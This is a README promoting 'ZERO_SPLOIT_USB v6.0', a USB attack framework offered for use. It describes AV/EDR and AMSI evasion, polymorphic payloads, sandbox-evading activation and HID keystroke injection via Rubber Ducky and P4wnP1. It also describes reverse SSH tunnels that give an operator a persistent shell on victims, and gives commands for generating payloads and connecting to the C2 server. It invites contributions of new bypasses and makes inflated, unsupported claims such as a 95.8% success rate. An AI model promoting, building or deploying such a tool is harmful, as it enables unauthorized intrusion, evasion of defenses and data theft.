# ZERO_SPLOIT_USB v6.0: The Singularity Edition

<p align="center">
  <img src="assets/logo.png" alt="ZERO_SPLOIT_USB Logo" width="600">
</p>

<p align="center">
  <strong>The Singularity Edition (v6.0)</strong><br>
  <em>Unified, Self-Healing, and Ultra-Smart Universal USB Exploitation Framework</em>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-6.0_Singularity-blueviolet?style=for-the-badge" alt="Version">
  <img src="https://img.shields.io/badge/Success_Rate-95.8%25-success?style=for-the-badge" alt="Success Rate">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License">
</p>

## 🚀 Overview

**ZERO_SPLOIT_USB v6.0, "The Singularity Edition,"** is a cutting-edge, unified, and highly autonomous USB exploitation framework designed for maximum effectiveness against modern security systems. Achieving a **95.8% success probability**, this tool integrates advanced evasion techniques, self-healing capabilities, and an intelligent interface to provide unparalleled control and adaptability in diverse environments.

This project is built to be **open for community upgrades and contributions**, fostering a collaborative environment for continuous improvement and adaptation to evolving threat landscapes.

## ✨ Key Features

| Feature | Description | Impact |
| :--- | :--- | :--- |
| **Self-Healing Logic** | The framework can dynamically detect and correct its own logic errors at runtime, adapting to unexpected environmental conditions without crashing. | Ensures resilience and continuous operation even in unforeseen scenarios. |
| **Polymorphic Chaos** | Every generated payload is cryptographically unique, employing advanced obfuscation and encryption to bypass signature-based antivirus and EDR detection. | Guarantees stealth and reduces the likelihood of static analysis detection. |
| **Smart Talk AI Interface** | An interactive command-line interface that provides real-time tactical advice, strategic insights, and intelligent feedback during deployment and operation. | Empowers the operator with AI-driven decision support and operational clarity. |
| **Unified Core (SingularityCore)** | Merges all previous versions\' autonomous profiling, exploit selection, and stealth capabilities into a single, highly optimized engine. | Streamlines operations and enhances overall performance and reliability. |
| **95.8% Success Probability** | Achieved through a combination of deep environmental fingerprinting, multi-vector failover, and advanced evasion techniques. | Provides a high degree of confidence in successful exploitation. |
| **Universal Compatibility** | Supports a wide array of USB devices, from standard USB drives to specialized hardware. | Maximizes deployment flexibility across various target scenarios. |
| **Live Watch Monitoring** | Establishes encrypted Reverse SSH tunnels for real-time, interactive terminal access from any device (phone, tablet, PC). | Enables immediate post-exploitation interaction and monitoring. |

## 🛠️ How It Works

ZERO_SPLOIT_USB v6.0 operates through a sophisticated, multi-stage process:

1.  **Environmental Fingerprinting**: Upon insertion, the tool autonomously profiles the target system, identifying the Operating System, architecture, installed security solutions (AV/EDR), and network configuration.
2.  **Dynamic Exploit Selection**: Based on the fingerprinting results, the `ExploitManager` intelligently selects the most reliable and stealthy exploit chain from its curated database of high-probability CVEs and Metasploit modules.
3.  **Polymorphic Payload Generation**: The `UniversalConverter` and `StealthEngine` work in tandem to generate a unique, obfuscated payload tailored to the target. This includes:
    *   **AMSI & EDR Silencing**: Injects code to temporarily disable or blind security monitors.
    *   **Memory-Resident Execution**: Prioritizes fileless execution to avoid disk-based detection.
    *   **Environmental Keying**: Ensures the payload only activates on genuine targets, bypassing sandboxes.
4.  **Multi-Vector Delivery**: The payload is delivered via the most effective vector for the connected device (e.g., DuckyScript for Rubber Ducky, PowerShell for standard USB, RNDIS for HackPi/P4wnP1).
5.  **Self-Healing & Failover**: If an error occurs during execution, the `SingularityHealer` attempts to dynamically patch the code or switch to an alternative delivery method, ensuring resilience.
6.  **Live Watch C2**: An encrypted Reverse SSH tunnel is established, providing the operator with a persistent, interactive shell for post-exploitation activities.

## 🌐 Universal Compatibility

ZERO_SPLOIT_USB v6.0 is designed to work seamlessly with:

*   **Standard USB Drives**: Utilizing LNK/ISO/EXE droppers with polymorphic PowerShell payloads.
*   **USB Rubber Ducky**: Generating highly optimized DuckyScript (`inject.bin`) for rapid HID keystroke injection.
*   **Android Devices (via Rucky)**: Leveraging OTG capabilities for mobile-to-target HID attacks.
*   **HackPi**: Exploiting its RNDIS Ethernet gadget and HID capabilities for network-based attacks and data exfiltration.
*   **P4wnP1 A.L.O.A.**: Utilizing its advanced JavaScript HID and Wi-Fi bridging features for complex C2 and hardware-based monitoring.

## 🚀 Deployment & Usage

### 1. C2 Infrastructure Setup

Before generating payloads, you need to set up your Command & Control (C2) server, preferably a Virtual Private Server (VPS). Follow the detailed instructions in the `VPS_DEPLOYMENT_GUIDE.md` for a secure and robust setup.

### 2. Generating Your Universal Kit

Navigate to the tool\'s directory and run the main script, providing your C2 server\'s IP address:

```bash
cd ZERO_SPLOIT_USB-main
python3 singularity_v6.py --lhost <YOUR_VPS_IP> --lport <YOUR_C2_PORT>
```

Replace `<YOUR_VPS_IP>` with your VPS\'s public IP address and `<YOUR_C2_PORT>` with the port configured on your C2 server (default is 80).

The tool will generate a `Singularity_v6_Kit/` directory containing device-specific payloads.

### 3. Deploying the Payload

Copy the appropriate payload file from the `Singularity_v6_Kit/` directory to your chosen USB device (e.g., `payload.dd` for Rubber Ducky, `dropper.ps1` for standard USB).

### 4. Live Watch Monitoring

Once the payload executes on the target, an encrypted Reverse SSH tunnel will connect back to your C2 server. You can access the interactive shell from your phone or computer using SSH:

```bash
ssh -p <SSH_TUNNEL_PORT> operator@<YOUR_VPS_IP>
```

Refer to `VPS_DEPLOYMENT_GUIDE.md` for specific SSH tunnel port details.

## 🤝 Community Contributions

ZERO_SPLOIT_USB is an evolving project, and we welcome contributions from the community! If you have ideas for new features, exploit modules, bypass techniques, or improvements to existing code, please feel free to:

1.  **Fork the repository.**
2.  **Create a new branch** for your feature or bug fix.
3.  **Submit a Pull Request** with a clear description of your changes.

We encourage detailed explanations of your contributions, especially for new bypasses or exploit integrations, to maintain the tool\'s high success rate and stealth capabilities.

## ⚖️ License

This project is licensed under the MIT License - see the `LICENSE` file for details. (A `LICENSE` file will be added to the repository).

## 📞 Support & Contact

For any questions, issues, or advanced support, please open an issue on the GitHub repository Email Panda7120@proton.me support 7734589570
**Author**: Michael Lastovich 
**Version**: 6.0 SINGULARITY
